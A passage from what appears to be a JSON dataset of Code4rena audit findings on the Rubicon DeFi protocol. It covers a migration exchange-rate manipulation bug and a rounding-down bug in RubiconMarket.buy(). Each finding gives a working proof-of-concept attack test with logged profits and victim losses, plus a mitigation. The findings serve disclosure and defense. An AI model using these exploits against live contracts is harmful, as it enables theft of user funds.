console.log(`After Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceAfter}`)\n\n    const underlyingBalanceBefore = await testCoin.balanceOf(owner.address);\n    await bathTokenV2.approve(bathTokenV2.address, bathTokenV2BalanceAfter);\n    await bathTokenV2.redeem(bathTokenV2BalanceAfter);\n    const underlyingBalanceAfter = await testCoin.balanceOf(owner.address);\n    console.log(`\\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: ${underlyingBalanceAfter}`)\n    console.log(`After Redemption - BathTokenV2 Balance [Victim]: ${await bathTokenV2.balanceOf(owner.address)}`)\n  });\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITHOUT REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995505034745960181\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITH REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995500999977864007\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\nIt is simulated the amount of underlying tokens that the victim would receive in either cases. The difference between the scenario A and B (without repayment and repaying the borrow) is: `WITHOUT_REPAYING - WITH_REPAYMENT = 19899995499999977864007 - 19899995504034745960181 = -4034768096174`, considering that the `TestCoin` has 8 decimals and is a valuable token (like `WBTC`) the loss of migrating will mean `40347` of tokens even if the price is 1 USD per token, the loss is considerable.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/V2Migrator.sol#L38\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools used\nManual review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/V2Migrator.sol#L38\n\n\n# Vulnerability details\n\n## Impact\nIt is possible to manipulate the price of BathV2 tokens before a migration and consequently the migrator will receive underpriced V2 tokens, incurring losses.\n\nThe migration process of `V2Migrator.migrate()` hands in the user's `BathV1` balance in exchange of its underlying. Then, proceeds to mint the counterpart of `BathV2` tokens providing the same amount of recovered underlying tokens:\n\n```solidity\nfunction migrate(IBathToken bathTokenV1) external {\n    //////////////// V1 WITHDRAWAL ////////////////\n    uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n    require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n    /// @dev approve first\n    bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n    // withdraw all tokens from the pool\n    uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n    //////////////// V2 DEPOSIT ////////////////\n    IERC20 underlying = bathTokenV1.underlyingToken();\n    address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n    underlying.approve(bathTokenV2, amountWithdrawn);\n    require(\n        CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n        \"migrate: MINT FAILED\"\n    );\n    /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n    IERC20(bathTokenV2).transfer(\n        msg.sender,\n        IERC20(bathTokenV2).balanceOf(address(this))\n    );\n    ...\n}\n```\nThis process can be abused from external actors when the V2 pool has low liquidity to manipulate the price of the V2 tokens considerably changing the amount of V2 tokens received by the migrating user.\n\nThe amount of V2 tokens (`CTokens`) that are minted are calculated after accruing the respective interests in `CToken.mintFresh()`:\n\n```solidity\nfunction mintFresh(address minter, uint mintAmount) internal {\n    // ... minting checks  ...\n\n    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});\n\n    uint mintTokens = div_(actualMintAmount, exchangeRate);\n\n    /*\n    * We calculate the new total supply of cTokens and minter token balance, checking for overflow:\n    *  totalSupplyNew = totalSupply + mintTokens\n    *  accountTokensNew = accountTokens[minter] + mintTokens\n    * And write them into storage\n    */\n    totalSupply = totalSupply + mintTokens;\n    accountTokens[minter] = accountTokens[minter] + mintTokens;\n\n    /* We emit a Mint event, and a Transfer event */\n    emit Mint(minter, actualMintAmount, mintTokens);\n    emit Transfer(address(this), minter, mintTokens);\n\n    /* We call the defense hook */\n    // unused function\n    // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);\n\n}\n```\nAn attacker is able to manipulate the `exchangeRate` so it harms the subsequent minters:\n\n```solidity\nfunction exchangeRateStoredInternal() virtual internal view returns (uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        /*\n            * If there are no tokens minted:\n            *  exchangeRate = initialExchangeRate\n            */\n        return initialExchangeRateMantissa;\n    } else {\n        /*\n            * Otherwise:\n            *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n            */\n        uint totalCash = getCashPrior();\n        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;\n        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;\n\n        return exchangeRate;\n    }\n}\n```\n\nEssentially, more tokens will be minted if the rate is decreased as it is dividing the `actualMintAmount`, which could be done by increasing the `totalSupply`. The opposite effect can be done by increasing the `totalCash` or the `totalBorrows`, for example.\n\n## Proof of Concept\nThis scenario can be abused by attackers willing to harm other users that are migrating from one type of token to another, knowing that the liquidity of the pool is low.\n\nThe following script shows how an attacker is able to manipulate the price of the V2 token by borrowing in the same market. The output shows both scenarios, when the price is manipulated and when it is under normal conditions.\n\n```ts\n  it(\"can manipulate the migration yield\", async function () {\n    const { testCoin, migrator, bathTokenV1, bathTokenV2, owner, otherAccount, comptroller } = await loadFixture(\n      deployBathTokensFixture\n    );\n    // *** POOLS UTILITY\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n    await priceOracle.addCtoken(testCoin.address, parseUnits(\"1\", 30));\n    await priceOracle.addCtoken(bathTokenV2.address, parseUnits(\"1\", 30));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n    await comptroller._supportMarket(bathTokenV2.address)\n\n    await comptroller._setCollateralFactor(\n      bathTokenV2.address,\n      parseUnits(\"0.9\", 18)\n    ); // 90% of collateral is borrowable\n    await comptroller._setBorrowPaused(bathTokenV2.address, false)\n\n    const simulatedFlashloanAmount = 10_000_000\n    await testCoin.connect(otherAccount).faucetWithAmountUnchecked(simulatedFlashloanAmount); // 10MM flashloan of testCoins\n    const initialTestBalance = await testCoin.balanceOf(otherAccount.address)\n    console.log(`Initial - TestCoin Balance [Attacker]: ${initialTestBalance}`)\n\n    // A big borrow lands before the migration\n    await testCoin.connect(otherAccount).approve(bathTokenV2.address, initialTestBalance);\n    await bathTokenV2.connect(otherAccount).mint(initialTestBalance);\n    console.log(`\\nBefore Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n    await bathTokenV2.connect(otherAccount).borrow(initialTestBalance.mul(89).div(100));\n    console.log(`After Borrow - TestCoin Balance [Attacker]: ${await testCoin.balanceOf(otherAccount.address)}`)\n\n    // ======= Comment/Uncomment this for the manipulated scenario ===========\n    // await testCoin.connect(otherAccount).approve(bathTokenV2.address, ethers.constants.MaxUint256);\n    // await bathTokenV2.connect(otherAccount).repayBorrow((await testCoin.balanceOf(otherAccount.address)))\n    // =======================================================================\n\n    // bath balance before migration\n    const bathTokenV1BalanceBefore = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceBefore = await bathTokenV2.balanceOf(owner.address);\n    console.log(`\\nBefore Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceBefore}`)\n    console.log(`Before Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceBefore}`)\n\n    await bathTokenV1.approve(migrator.address, bathTokenV1BalanceBefore);\n    await migrator.migrate(bathTokenV1.address);\n\n    // bath balance after migration\n    const bathTokenV1BalanceAfter = await bathTokenV1.balanceOf(owner.address);\n    const bathTokenV2BalanceAfter = await bathTokenV2.balanceOf(owner.address);\n\n    console.log(`\\nAfter Migration - BathTokenV1 Balance [Victim]: ${bathTokenV1BalanceAfter}`)\n    console.log(`After Migration - BathTokenV2 Balance [Victim]: ${bathTokenV2BalanceAfter}`)\n\n    const underlyingBalanceBefore = await testCoin.balanceOf(owner.address);\n    await bathTokenV2.approve(bathTokenV2.address, bathTokenV2BalanceAfter);\n    await bathTokenV2.redeem(bathTokenV2BalanceAfter);\n    const underlyingBalanceAfter = await testCoin.balanceOf(owner.address);\n    console.log(`\\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: ${underlyingBalanceAfter}`)\n    console.log(`After Redemption - BathTokenV2 Balance [Victim]: ${await bathTokenV2.balanceOf(owner.address)}`)\n  });\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITHOUT REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995505034745960181\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\n```bash\n- WITH A BIG BORROW BEFORE THE MIGRATION, WITH REPAYMENT\nInitial - TestCoin Balance [Attacker]: 10000000000000000000000000\n\nBefore Borrow - TestCoin Balance [Attacker]: 0\nAfter Borrow - TestCoin Balance [Attacker]: 8900000000000000000000000\n\nBefore Migration - BathTokenV1 Balance [Victim]: 14999999999999999000\nBefore Migration - BathTokenV2 Balance [Victim]: 0\n\nAfter Migration - BathTokenV1 Balance [Victim]: 0\nAfter Migration - BathTokenV2 Balance [Victim]: 74977479826\n\nAfter Redemption - TestCoin (Underlying) Balance [Victim]: 9899995500999977864007\nAfter Redemption - BathTokenV2 Balance [Victim]: 0\n```\n\nIt is simulated the amount of underlying tokens that the victim would receive in either cases. The difference between the scenario A and B (without repayment and repaying the borrow) is: `WITHOUT_REPAYING - WITH_REPAYMENT = 19899995499999977864007 - 19899995504034745960181 = -4034768096174`, considering that the `TestCoin` has 8 decimals and is a valuable token (like `WBTC`) the loss of migrating will mean `40347` of tokens even if the price is 1 USD per token, the loss is considerable.\n\n## Tools used\nManual review\n\n## Mitigation\nSimulate the amount of underlying tokens users would get if they redeem the whole `BathV2` amount immediately after migrating and allow users to set up a slippage on the amount of underlying tokens they would get (comparing against the simulated amount)\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 540,
      "page_start": null,
      "heading": "540. Attack on rounding errors to get risk free profit",
      "heading_cleaned": "Attack on rounding errors to get risk free profit",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L319\n\n\n# Vulnerability details\n\n## Impact\nWhen users ```buy()``` from ````RubiconMarket````, their ````spend```` is rounded down. Tokens with small decimas, such as WBTC and GUSD, are vulnerable to rounding error attack. Attackers can exploit it to get risk free profit.\n\n## Proof of Concept\nThe issue arises on L319 of ````buy()````, we can see calculation of ````spend```` is rounded down.\n```solidity\nFile: contracts\\RubiconMarket.sol\n314:     function buy(\n315:         uint256 id,\n316:         uint256 quantity\n317:     ) public virtual can_buy(id) synchronized returns (bool) {\n318:         OfferInfo memory _offer = offers[id];\n319:         uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt; // @audit should rounde up\n...\n447:         return true;\n448:     }\n```\n\nThe following test cases show how attackers can exploit it to get profit.\n\n```solidity\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract MockERC20 is ERC20 {\n    uint8 private decimals_;\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) ERC20(_name, _symbol) {\n        decimals_ = _decimals;\n    }\n\n    function decimals() public view override returns (uint8) {\n        return decimals_;\n    }\n\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount * 10 ** decimals_);\n    }\n}\n\n/// @notice proxy isn't used here\ncontract AttackOnRoundingError is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address attacker = address(0x01020304);\n  uint256 WBTCOfferId;\n  uint256 GUSDOfferId;\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  MockERC20 USDC;\n  MockERC20 WBTC;\n  MockERC20 GUSD;\n\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    USDC = new MockERC20(\"Test Stablecoin\", \"USDC\", 6);\n    WBTC = new MockERC20(\"Wrapped BTC\", \"WBTC\", 8);\n    // the top 77th token: https://coinmarketcap.com/currencies/gemini-dollar/\n    GUSD = new MockERC20(\"Gemini USD\", \"GUSD\", 2);\n\n    USDC.mint(address(this), 1_000_000);\n    USDC.approve(address(market), type(uint256).max);\n    // place ask and bid for WBTC/USDC pair at price 30,000 USDC/WBTC\n    WBTCOfferId = market.offer(300000e6, USDC, 10e8, WBTC, address(this), owner);\n\n    // place ask and bid for GUSD/USC pair at price 1 USDC/GUSD\n    GUSDOfferId = market.offer(300000e6, USDC, 300000e2, GUSD, address(this), owner);\n\n\n    WBTC.mint(attacker, 10);\n    vm.prank(attacker);\n    WBTC.approve(address(market), type(uint256).max);\n\n    GUSD.mint(attacker, 100000);\n    vm.prank(attacker);\n    GUSD.approve(address(market), type(uint256).max);\n  }\n\n  function test_AttackOnWBTCPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 WBTCSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 WBTCBalanceBefore = WBTC.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(WBTCOfferId, 599);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 WBTCBalanceAfter = WBTC.balanceOf(attacker);\n      WBTCSent = WBTCBalanceBefore - WBTCBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 4e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 WBTCCostInUSDC = WBTCSent * 30000e6 / 1e8;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + WBTCCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on WBTC pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 4 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: WBTC(8), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"WBTC cost:\", WBTCSent);\n    console.log(\"WBTC cost in USDC:\", WBTCCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n  function test_AttackOnGUSDPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 GUSDSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 GUSDBalanceBefore = GUSD.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(GUSDOfferId, 19_999);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 GUSDBalanceAfter = GUSD.balanceOf(attacker);\n      GUSDSent = GUSDBalanceBefore - GUSDBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 20e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 GUSDCostInUSDC = GUSDSent * 1e6 / 1e2;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + GUSDCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on GUSD pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 20 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: GUSD(2), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"GUSD cost:\", GUSDSent);\n    console.log(\"GUSD cost in USDC:\", GUSDCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n}\n\n```\n\n#### Case 1:  ````WBTC/USDC```` pair\nThe given market parameters and test result for case 1:\n```solidity\n[PASS] test_AttackOnWBTCPair() (gas: 11427870)\nLogs:\n  ==========Attack on WBTC pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 4 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: WBTC(8), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 32104\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  WBTC cost: 300\n  WBTC cost in USDC: 90000\n  Total cost in USDC: 150607\n  USDC received: 179700\n  Profit in USDC: 29093\n  Profit in percentage: 19 %\n```\nFrom the log, we can see a 19% profit in one attack. The absolute profit value is about 0.029 USDC, though it is small, but Optimism confirms transactions instantly, attackers can submit huge number of transactions such as 1M to get 29,000 USDC profit.\n\nOne point needs to be pointed out, market parameters other than L1 gas price are consistent with the actual normal situations. The 4 Gwei L1 gas price is a a relatively low price, and it's a key condition to make the attack be profitable. But this scenario can actually happen, here is some instances when gas price drops below 4 Gwei.\nsource: https://public-grafana.optimism.io/d/9hkhMxn7z/public-dashboard?orgId=1&refresh=5m&viewPanel=6&from=now-1y&to=now&inspect=6&inspectTab=data\n```solidity\n2022/8/21 18:00 | 1.56939\n2022/9/19 18:00 | 2.3536\n2022/9/17 12:00 | 2.63193\n2022/7/31 12:00 | 2.87714\n2022/8/21 12:00 | 2.99122\n2022/7/31 6:00 | 3.03533\n2022/10/5 18:00 | 3.14388\n2022/9/4 18:00 | 3.15065\n2022/10/2 18:00 | 3.18227\n2022/9/4 6:00 | 3.19788\n2022/7/31 18:00 | 3.20089\n2022/8/1 12:00 | 3.22637\n2022/9/4 12:00 | 3.34139\n2022/8/20 18:00 | 3.57428\n2022/9/18 12:00 | 3.57598\n2022/9/22 18:00 | 3.60006\n2022/8/14 18:00 | 3.63901\n2022/9/18 6:00 | 3.72209\n2022/9/12 12:00 | 3.74844\n2022/8/29 0:00 | 3.8843\n2022/8/21 6:00 | 3.94099\n2022/9/25 12:00 | 3.97128\n2022/9/21 18:00 | 3.98098\n2022/8/6 18:00 | 3.98923\n```\n\n#### Case 2:  ````GUSD/USDC```` pair\nThe given market parameters and test result for case 2:\n```solidity\n[PASS] test_AttackOnGUSDPair() (gas: 11427889)\nLogs:\n  ==========Attack on GUSD pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 20 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: GUSD(2), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 160520\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  GUSD cost: 300\n  GUSD cost in USDC: 3000000\n  Total cost in USDC: 3189023\n  USDC received: 5999400\n  Profit in USDC: 2810377\n  Profit in percentage: 88 %\n```\nFor the ````GUSD```` pair, we can see, even on a normal 20 Gwei L1 gas price condition, the attack profit rate is 88%. The absolute profit value in one attack is about 2.8 USDC. Similarly,  attackers can submit huge number of transactions to make a significant profit.\n\n## Tools Used\nManually review\n\n## Recommended Mitigation Steps\nCalculation of ````spend```` should be rounded up.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L319\n\n\n# Vulnerability details\n\n## Impact\nWhen users ```buy()``` from ````RubiconMarket````, their ````spend```` is rounded down. Tokens with small decimas, such as WBTC and GUSD, are vulnerable to rounding error attack. Attackers can exploit it to get risk free profit.\n\n## Proof of Concept\nThe issue arises on L319 of ````buy()````, we can see calculation of ````spend```` is rounded down.\n```solidity\nFile: contracts\\RubiconMarket.sol\n314:     function buy(\n315:         uint256 id,\n316:         uint256 quantity\n317:     ) public virtual can_buy(id) synchronized returns (bool) {\n318:         OfferInfo memory _offer = offers[id];\n319:         uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt; // @audit should rounde up\n...\n447:         return true;\n448:     }\n```\n\nThe following test cases show how attackers can exploit it to get profit.\n\n```solidity\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract MockERC20 is ERC20 {\n    uint8 private decimals_;\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) ERC20(_name, _symbol) {\n        decimals_ = _decimals;\n    }\n\n    function decimals() public view override returns (uint8) {\n        return decimals_;\n    }\n\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount * 10 ** decimals_);\n    }\n}\n\n/// @notice proxy isn't used here\ncontract AttackOnRoundingError is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address attacker = address(0x01020304);\n  uint256 WBTCOfferId;\n  uint256 GUSDOfferId;\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  MockERC20 USDC;\n  MockERC20 WBTC;\n  MockERC20 GUSD;\n\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    USDC = new MockERC20(\"Test Stablecoin\", \"USDC\", 6);\n    WBTC = new MockERC20(\"Wrapped BTC\", \"WBTC\", 8);\n    // the top 77th token: https://coinmarketcap.com/currencies/gemini-dollar/ \n    GUSD = new MockERC20(\"Gemini USD\", \"GUSD\", 2);\n\n    USDC.mint(address(this), 1_000_000);\n    USDC.approve(address(market), type(uint256).max);\n    // place ask and bid for WBTC/USDC pair at price 30,000 USDC/WBTC\n    WBTCOfferId = market.offer(300000e6, USDC, 10e8, WBTC, address(this), owner);\n\n    // place ask and bid for GUSD/USC pair at price 1 USDC/GUSD\n    GUSDOfferId = market.offer(300000e6, USDC, 300000e2, GUSD, address(this), owner);\n\n\n    WBTC.mint(attacker, 10);\n    vm.prank(attacker);\n    WBTC.approve(address(market), type(uint256).max);\n\n    GUSD.mint(attacker, 100000);\n    vm.prank(attacker);\n    GUSD.approve(address(market), type(uint256).max);\n  }\n\n  function test_AttackOnWBTCPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 WBTCSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 WBTCBalanceBefore = WBTC.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(WBTCOfferId, 599);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 WBTCBalanceAfter = WBTC.balanceOf(attacker);\n      WBTCSent = WBTCBalanceBefore - WBTCBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 4e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 WBTCCostInUSDC = WBTCSent * 30000e6 / 1e8;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + WBTCCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on WBTC pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 4 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: WBTC(8), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"WBTC cost:\", WBTCSent);\n    console.log(\"WBTC cost in USDC:\", WBTCCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n  function test_AttackOnGUSDPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 GUSDSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 GUSDBalanceBefore = GUSD.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(GUSDOfferId, 19_999);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 GUSDBalanceAfter = GUSD.balanceOf(attacker);\n      GUSDSent = GUSDBalanceBefore - GUSDBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 20e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 